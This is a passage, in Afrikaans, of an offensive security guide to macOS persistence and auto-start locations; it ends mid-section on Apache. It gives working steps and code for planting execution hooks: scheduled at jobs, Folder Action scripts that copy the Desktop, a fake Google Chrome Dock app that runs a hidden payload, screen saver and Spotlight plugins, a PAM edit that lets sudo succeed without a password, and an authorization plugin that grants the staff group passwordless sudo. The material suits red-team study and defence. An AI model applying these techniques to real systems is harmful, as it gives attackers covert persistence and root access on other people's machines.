#### **Beskrywing**

`at`-take is ontwerp vir die **skedulering van eenmalige take** wat op bepaalde tye uitgevoer moet word. Anders as cron jobs word `at`-take outomaties ná uitvoering verwyder. Dit is belangrik om daarop te let dat hierdie take oor stelselherlaaie heen persistent is, wat dit onder sekere omstandighede ’n potensiële sekuriteitsrisiko maak.<sup>[16]</sup>

By **verstek** is hulle **gedeaktiveer**, maar die **root**-gebruiker kan **dit** met die volgende **aktiveer**:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Dit sal oor 1 uur ’n lêer skep:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Kontroleer die job queue met `atq`:
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Hierbo kan ons twee geskeduleerde take sien. Ons kan die besonderhede van die taak vertoon met `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> As AT-take nie geaktiveer is nie, sal die geskepte take nie uitgevoer word nie.

Die **job files** kan gevind word by `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Die lêernaam bevat die queue, die job number en die tyd waarop dit geskeduleer is om te loop. Kom ons kyk byvoorbeeld na `a0001a019bdcd2`.

- `a` - dit is die queue
- `0001a` - job number in hex, `0x1a = 26`
- `019bdcd2` - tyd in hex. Dit verteenwoordig die minute wat sedert epoch verloop het. `0x019bdcd2` is `26991826` in desimaal. As ons dit met 60 vermenigvuldig, kry ons `1619509560`, wat `GMT: 2021. April 27., Tuesday 7:46:00` is.

As ons die job file druk, vind ons dat dit dieselfde inligting bevat as wat ons met `at -c` gekry het.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
- Maar jy moet `osascript` met arguments kan call om met **`System Events`** kontak te maak sodat jy Folder Actions kan configure
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Dit het basiese TCC-permissions soos Desktop, Documents en Downloads

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Root required
- **Trigger**: Toegang tot die gespesifiseerde folder
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Toegang tot die gespesifiseerde folder

#### Description & Exploitation

Folder Actions is scripts wat outomaties getrigger word deur changes in ’n folder, soos die byvoeging of verwydering van items, of ander actions soos die opening of resizing van die folder window. Hierdie actions kan vir verskeie take gebruik word en kan op verskillende maniere getrigger word, soos deur die Finder UI of terminal commands.<sup>[17][18]</sup>

Om Folder Actions op te stel, het jy opsies soos:

1. Om ’n Folder Action-workflow met [Automator](https://support.apple.com/guide/automator/welcome/mac) te craft en dit as ’n service te installeer.
2. Om ’n script handmatig via Folder Actions Setup in die context menu van ’n folder te attach.
3. Om OSAScript te gebruik om Apple Event messages na die `System Events.app` te stuur vir die programmatiese opstel van ’n Folder Action.
- Hierdie metode is besonder nuttig om die action in die system te embed, wat ’n vlak van persistence bied.

Die volgende script is ’n voorbeeld van wat deur ’n Folder Action uitgevoer kan word:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Om die bogenoemde skrip bruikbaar vir Folder Actions te maak, kompileer dit met:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Nadat die script gekompileer is, stel Folder Actions op deur die onderstaande script uit te voer. Hierdie script sal Folder Actions globaal aktiveer en spesifiek die voorheen gekompileerde script aan die Desktop-lêergids koppel.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Voer die setup script uit met:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Dit is die manier om hierdie persistence via GUI te implementeer:

Dit is die script wat uitgevoer sal word:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Kompileer dit met: `osacompile -l JavaScript -o folder.scpt source.js`

Skuif dit na:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Then, maak die `Folder Actions Setup`-app oop, kies die **vouer wat jy wil monitor** en kies in jou geval **`folder.scpt`** (in my geval het ek dit output2.scp genoem):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

As jy nou daardie vouer met **Finder** oopmaak, sal jou script uitgevoer word.

Hierdie konfigurasie is in die **plist** gestoor wat in **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** geleë is, in base64-formaat.

Kom ons probeer nou om hierdie persistence sonder GUI-toegang voor te berei:

1. **Kopieer `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** na `/tmp` om dit te rugsteun:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Verwyder** die Folder Actions wat jy pas opgestel het:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Noudat ons ’n leë omgewing het

3. Kopieer die rugsteunlêer: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Maak die Folder Actions Setup.app oop om hierdie konfigurasie te verwerk: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> En dit het nie vir my gewerk nie, maar dit is die instruksies uit die writeup:(

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar jy moet ’n malicious application binne die stelsel geïnstalleer hê
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: Wanneer die gebruiker op die app binne die dock klik

#### Description & Exploitation

Al die applications wat in die Dock verskyn, word binne die plist gespesifiseer: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[19]</sup>

Dit is moontlik om **’n application by te voeg** net met:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Deur **social engineering** te gebruik, kan jy **byvoorbeeld Google Chrome naboots** binne die dock en eintlik jou eie script uitvoer:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Kleurkiesers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- ’n Baie spesifieke aksie moet plaasvind
- Jy sal in ’n ander sandbox eindig
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `/Library/ColorPickers`
- Root word vereis
- Trigger: Gebruik die kleurkieser
- `~/Library/ColorPickers`
- Trigger: Gebruik die kleurkieser

#### Beskrywing & Exploit

**Compile ’n color picker**-bundle met jou kode (jy kan byvoorbeeld [**hierdie een**](https://github.com/viktorstrate/color-picker-plus) gebruik) en voeg ’n constructor by (soos in die [Screen Saver-afdeling](macos-auto-start-locations.md#screen-saver)) en kopieer die bundle na `~/Library/ColorPickers`.<sup>[20]</sup>

Dan, wanneer die kleurkieser geaktiveer word, behoort jou kode ook uitgevoer te word.

Let daarop dat die binary wat jou library laai, ’n **baie beperkende sandbox** het: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Nuttig om sandbox te omseil: **Nee, omdat jy jou eie app moet uitvoer**
- TCC bypass: ???

#### Ligging

- 'n Spesifieke app

#### Beskrywing & Exploit

'n Voorbeeld van 'n toepassing met 'n Finder Sync Extension [**kan hier gevind word**](https://github.com/D00MFist/InSync).

Toepassings kan `Finder Sync Extensions` hê. Hierdie extension sal binne 'n toepassing wees wat uitgevoer sal word. Daarbenewens moet die extension **signed** wees met 'n geldige Apple developer certificate, dit moet **sandboxed** wees (hoewel relaxed exceptions bygevoeg kan word), en dit moet met iets soos die volgende geregistreer wees:<sup>[21][22]</sup>
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Skermbewaarder

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy sal in ’n algemene application sandbox eindig
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `/System/Library/Screen Savers`
- Root vereis
- **Sneller**: Kies die skermbewaarder
- `/Library/Screen Savers`
- Root vereis
- **Sneller**: Kies die skermbewaarder
- `~/Library/Screen Savers`
- **Sneller**: Kies die skermbewaarder

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Beskrywing & Exploit

Skep ’n nuwe projek in Xcode en kies die template om ’n nuwe **Screen Saver** te genereer. Voeg dan jou code daarby, byvoorbeeld die volgende code om logs te genereer.<sup>[23][24]</sup>

**Build** dit, en kopieer die `.saver` bundle na **`~/Library/Screen Savers`**. Maak dan die Screen Saver GUI oop en as jy net daarop klik, behoort dit baie logs te genereer:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Let daarop dat jy, omdat jy binne die entitlements van die binary wat hierdie code laai (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) **`com.apple.security.app-sandbox`** kan vind, **binne die algemene application sandbox** sal wees.

Saver-kode:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy sal in 'n application sandbox eindig
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Die sandbox lyk baie beperk

#### Ligging

- `~/Library/Spotlight/`
- **Trigger**: 'n Nuwe lêer met 'n lêeruitbreiding wat deur die spotlight plugin bestuur word, word geskep.
- `/Library/Spotlight/`
- **Trigger**: 'n Nuwe lêer met 'n lêeruitbreiding wat deur die spotlight plugin bestuur word, word geskep.
- Root required
- `/System/Library/Spotlight/`
- **Trigger**: 'n Nuwe lêer met 'n lêeruitbreiding wat deur die spotlight plugin bestuur word, word geskep.
- Root required
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: 'n Nuwe lêer met 'n lêeruitbreiding wat deur die spotlight plugin bestuur word, word geskep.
- New app required

#### Beskrywing & Exploitation

Spotlight is macOS se ingeboude soekfunksie, ontwerp om gebruikers **vinnige en omvattende toegang tot data op hul rekenaars** te bied.\
Om hierdie vinnige soekvermoë moontlik te maak, hou Spotlight 'n **proprietary database** in stand en skep dit 'n indeks deur **die meeste lêers te parse**, wat vinnige soektogte deur beide lêername en hul inhoud moontlik maak.<sup>[25]</sup>

Die onderliggende meganisme van Spotlight behels 'n sentrale proses genaamd 'mds', wat staan vir **'metadata server'.** Hierdie proses koördineer die hele Spotlight-diens. Daarbenewens is daar verskeie 'mdworker'-daemons wat 'n verskeidenheid instandhoudingstake uitvoer, soos om verskillende lêertipes te indekseer (`ps -ef | grep mdworker`). Hierdie take word moontlik gemaak deur Spotlight importer plugins, of **".mdimporter bundles**", wat Spotlight in staat stel om inhoud oor 'n uiteenlopende reeks lêerformate te verstaan en te indekseer.

Die plugins of **`.mdimporter`** bundles is op die plekke wat voorheen genoem is geleë, en as 'n nuwe bundle verskyn, word dit binne 'n minuut gelaai (geen diens hoef herbegin te word nie). Hierdie bundles moet aandui watter **lêertipe en uitbreidings hulle kan bestuur**, sodat Spotlight dit sal gebruik wanneer 'n nuwe lêer met die aangeduide uitbreiding geskep word.

Dit is moontlik om **al die `mdimporters`** wat gelaai is, te vind deur die volgende uit te voer:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
En byvoorbeeld word **/Library/Spotlight/iBooksAuthor.mdimporter** gebruik om hierdie tipe lêers te ontleed (uitbreidings `.iba` en `.book`, onder andere):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> As jy die Plist van ander `mdimporter` nagaan, sal jy dalk nie die inskrywing **`UTTypeConformsTo`** vind nie. Dit is omdat dit 'n ingeboude _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) is en dit nie uitbreidings hoef te spesifiseer nie.
>
> Boonop kry System default plugins altyd voorkeur, dus kan 'n aanvaller slegs toegang kry tot lêers wat nie andersins deur Apple se eie `mdimporters` geïndekseer word nie.

Om jou eie importer te skep, kan jy met hierdie projek begin: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) en dan die naam verander, die **`CFBundleDocumentTypes`** verander en **`UTImportedTypeDeclarations`** byvoeg sodat dit die uitbreiding ondersteun wat jy wil ondersteun, en dit in **`schema.xml`** weerspieël.\
Verander dan die code van die funksie **`GetMetadataForFile`** om jou payload uit te voer wanneer 'n lêer met die verwerkte uitbreiding geskep word.

Laastens, **build en kopieer jou nuwe `.mdimporter`** na een van die vorige liggings en jy kan nagaan wanneer dit gelaai word deur die **logs te monitor** of **`mdimport -L.`** na te gaan.

### ~~Preference Pane~~

> [!CAUTION]
> Dit lyk nie of dit meer werk nie.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Dit vereis 'n spesifieke user action
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

Dit lyk nie of dit meer werk nie.<sup>[26]</sup>

## Root Sandbox Bypass

> [!TIP]
> Hier kan jy start locations vind wat nuttig is vir **sandbox bypass**, wat jou toelaat om eenvoudig iets uit te voer deur dit **in 'n lêer te skryf** terwyl jy **root** is en/of ander **weird conditions** vereis.

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root required
- **Trigger**: Wanneer die tyd aanbreek
- `/etc/daily.local`, `/etc/weekly.local` of `/etc/monthly.local`
- Root required
- **Trigger**: Wanneer die tyd aanbreek

#### Description & Exploitation

Die periodic scripts (**`/etc/periodic`**) word uitgevoer as gevolg van die **launch daemons** wat in `/System/Library/LaunchDaemons/com.apple.periodic*` gekonfigureer is. Let daarop dat scripts wat in `/etc/periodic/` gestoor word, uitgevoer word as die **eienaar van die lêer,** dus sal dit nie werk vir 'n potensiële privilege escalation nie.<sup>[27]</sup>
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Daar is ander periodieke skrifte wat uitgevoer sal word, aangedui in **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
As jy daarin slaag om enige van die lêers `/etc/daily.local`, `/etc/weekly.local` of `/etc/monthly.local` te skryf, sal dit **vroeër of later uitgevoer word**.

> [!WARNING]
> Let daarop dat die periodic script **as die eienaar van die script uitgevoer sal word**. As ’n gewone gebruiker dus die script besit, sal dit as daardie gebruiker uitgevoer word (dit kan privilege escalation-aanvalle voorkom).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Root word altyd vereis

#### Beskrywing & Exploitation

Aangesien PAM meer op **persistence** en malware fokus as op maklike uitvoering binne macOS, sal hierdie blog nie ’n gedetailleerde verduideliking gee nie; **lees die writeups om hierdie tegniek beter te verstaan**.<sup>[28]</sup>

Kontroleer PAM-modules met:
```bash
ls -l /etc/pam.d
```
'n Persistence/privilege escalation-tegniek wat PAM misbruik, is so eenvoudig soos om die module /etc/pam.d/sudo te wysig en die volgende reël aan die begin by te voeg:
```bash
auth       sufficient     pam_permit.so
```
Dit sal **lyk** soos iets soos hierdie:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
En daarom sal enige poging om **`sudo` te gebruik werk**.

> [!CAUTION]
> Let daarop dat hierdie gids deur TCC beskerm word, so dit is hoogs waarskynlik dat die gebruiker ’n prompt sal kry wat vir toegang vra.

Nog ’n goeie voorbeeld is su, waar jy kan sien dat dit ook moontlik is om parameters aan die PAM modules te gee (en jy kan hierdie lêer ook backdoor):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees en ekstra configs maak
- TCC bypass: ???

#### Ligging

- `/Library/Security/SecurityAgentPlugins/`
- Root word vereis
- Dit is ook nodig om die authorization-databasis op te stel sodat dit die plugin gebruik

#### Beskrywing & Eksploitasie

Jy kan 'n authorization-plugin skep wat uitgevoer sal word wanneer 'n gebruiker aanmeld om persistence te handhaaf. Vir meer inligting oor hoe om een van hierdie plugins te skep, raadpleeg die vorige writeups (en wees versigtig: 'n swak geskryfde een kan jou uitsluit, waarna jy jou Mac vanuit Recovery Mode sal moet skoonmaak).<sup>[29][30]</sup>
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Move** die bundle na die ligging waar dit gelaai moet word:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Voeg uiteindelik die **reël** by om hierdie Plugin te laai:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Die **`evaluate-mechanisms`** sal die autorisasieraamwerk inlig dat dit **'n eksterne meganisme vir autorisasie moet aanroep**. Boonop sal **`privileged`** veroorsaak dat dit deur root uitgevoer word.

Aktiveer dit met:
```bash
security authorize com.asdf.asdf
```
En dan behoort die **staff group sudo**-toegang te hê (lees `/etc/sudoers` om dit te bevestig).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees en die user moet man gebruik
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/private/etc/man.conf`**
- Root word vereis
- **`/private/etc/man.conf`**: Wanneer man gebruik word

#### Beskrywing & Exploit

Die config file **`/private/etc/man.conf`** dui die binary/script aan wat gebruik moet word wanneer man documentation files oopmaak. Die pad na die executable kan dus gewysig word sodat ’n backdoor uitgevoer word wanneer die user man gebruik om dokumentasie te lees.<sup>[31]</sup>

Stel byvoorbeeld die volgende in **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
En skep dan `/tmp/view` as:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees en apache moet loop
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd het nie entitlements nie

#### Ligging

- **`/etc/apache2/httpd.conf`**
- Root vereis
- Sneller: Wanneer Apache2 begin word

#### Beskrywing & Exploit

